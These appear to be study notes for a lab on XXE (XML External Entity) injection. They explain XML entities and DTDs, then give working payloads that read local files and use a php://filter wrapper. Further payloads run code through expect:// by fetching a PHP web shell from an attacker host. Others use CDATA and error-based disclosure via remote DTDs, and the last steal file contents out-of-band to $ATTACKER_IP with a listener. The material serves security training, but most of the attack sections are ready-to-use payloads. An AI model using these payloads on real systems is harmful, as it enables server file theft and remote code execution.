### <span style="color:#50FA7B">What is XXE?</span>

**XXE (XML External Entity) injection** is a vulnerability that happens when a web app **uses XML data from users but doesn't handle it safely**.

It allows attackers to:

- Read secret files on the server (like `/etc/passwd`)
- Crash the server
- Even connect to internal systems behind firewalls

👉 **It’s dangerous**, and that’s why it’s on the OWASP Top 10 list of web risks.

### <span style="color:#50FA7B">**XML (Extensible Markup Language)**</span>
is a special format used to store and share structured data (like emails, invoices, etc.).
It's similar to HTML, but its main goal is to **hold data**, not to display it.

Here’s an example XML document:

```xml

<?xml version="1.0" encoding="UTF-8"?> 
<email> 
<date>01-01-2022</date> 
<sender>john@example.com</sender> 
<recipients> <to>HR@example.com</to> </recipients> 
<body>Hello, send me the invoice please.</body> 
</email> 
```

This XML has tags like `<date>`, `<sender>`, etc. They store the data inside them.


# <span style="color:#FF5555">Example</span>
- Normal Request
```xml
<?xml version="1.0" encoding="UTF-8"?>

<root>
<name>test</name>
<tel>etst</tel>
<email>test@gmail.com</email>
<message>test</message>
</root>
```

- Malicious Payload : We used email for the injection because its reflecting in the response 

```xml
<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>

<root>
<name>test</name>
<tel>etst</tel>
<email>&company;</email>
<message>test</message>
</root>
```

### <span style="color:#50FA7B">Basic Terms</span>

- **XML :** A format apps use to send data (like HTML but for data)
- **Entity :** A variable inside XML (can be used to load a file)
- **CDATA :** A tag to include **raw text** (e.g. file contents with symbols)
- **DTD :** A section in XML where you define entities (like a config)
- **XXE :** A hack where you use XML entities to read files from the server

# <span style="color:#FF5555">local File Disclosure</span>
- #### Normal payload
```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
```

#### <span style="color:#FFB86C">- wrapper to bypass restrictions</span>

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```

- #### Remote Code Execution with XXE
	- local server
		```bash
		echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
		sudo python3 -m http.server 80
		```
	  
	- xml payload for RCE
	  
```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
		```
# <span style="color:#FF5555">Advanced File Disclosure</span>

### <span style="color:#50FA7B">Method 1: CDATA Trick to Read Any File</span>

 1. Create a DTD File on Your Computer (xxe.dtd)

Run these commands on your own terminal:
```bash
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
python3 -m http.server 8000
```

2. Send the Main XML Payload to the Target (via Burp or curl)
```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///flag.php">
  <!ENTITY % end "]]>">
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %xxe;
]>
<email>&joined;</email>
```
This will:
- Read `/flag.php`
- Wrap the contents in `<![CDATA[ ... ]]>`
- Return it safely in XML format

### <span style="color:#50FA7B">Method 2: Error-Based XXE (for silent or hidden output)</span>
#### <span style="color:#FFB86C">Test it</span>
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY test "xxe_test">
]>
<root>
  <name></name>
  <tel>123</tel>
  <email>&test;</email>
  <message>hello</message>
</root>
```
### <span style="color:#50FA7B">Payload</span>
1. Create DTD Payload That Forces an Error
	Put this in `xxe.dtd`:
```xml
	<!ENTITY % file SYSTEM "file:///flag.php">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExisting;/flag.php'>">
```
Start the HTTP server again:
```bash
python3 -m http.server 8000
```

2. Send XML Payload That Triggers the Error
```xml
<!DOCTYPE email [
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```


# <span style="color:#FF5555">Blind Data Exfiltration</span>

### <span style="color:#50FA7B">What’s the Problem?</span>

You’re attacking a vulnerable web application with an **XXE payload**. But this time:

- You **don’t see any error messages**
- You **don’t see any file content returned**
- So it’s a **blind** vulnerability

So how can you **steal data** if nothing shows up on the page?
### <span style="color:#50FA7B">The Trick: Make the Server Send the Data _to You_</span>

You tell the vulnerable server:

> "Hey! Read a file… and then _send it to my machine in a URL_!"

This is called **Out-Of-Band (OOB) Exfiltration**, because the server doesn’t show you the file — it sends the data to **your own server** instead.

## <span style="color:#8BE9FD">Steps</span>

### <span style="color:#50FA7B">1.  Host a PHP listener</span>
You create a simple PHP file on your own machine:
```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
```
Save this as `index.php`

Then run a server:
```php
php -S 0.0.0.0:8000
```
This listens for incoming requests and prints out anything in `?content=...` (after decoding).

### <span style="color:#50FA7B">2. Write a Malicious DTD (hosted on your machine)</span>
Create a file called `xxe.dtd`:
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/327a6c4304ad5938eaf0efb6cc3e53dc.php">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://$ATTACKER_IP:8000/?content=%file;'>">
```
This tells the victim server:
- Read the target file
- Base64 encode it
- Then request `http://$ATTACKER_IP:8000/?content=ENCODED_TEXT`
### <span style="color:#50FA7B">3. Send the XXE Payload</span>

Send this XML to the  endpoint:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY % remote SYSTEM "http://$ATTACKER_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

The server will:

    Load your DTD
    Read the target file
    Send its base64-encoded content to your machine